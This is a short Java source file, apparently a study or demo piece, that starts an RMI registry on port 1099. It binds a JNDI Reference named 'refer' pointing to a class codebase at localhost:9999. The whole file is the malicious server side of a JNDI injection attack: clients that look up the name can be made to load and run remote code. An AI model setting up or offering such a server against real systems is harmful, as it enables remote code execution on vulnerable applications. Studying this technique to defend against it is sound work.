package JNDI.start;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws Exception {
        String referenceUrl = "http://localhost:9999";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("refer", "refer", referenceUrl);
        ReferenceWrapper refer = new ReferenceWrapper(reference);
        registry.bind("refer", refer);
    }
}
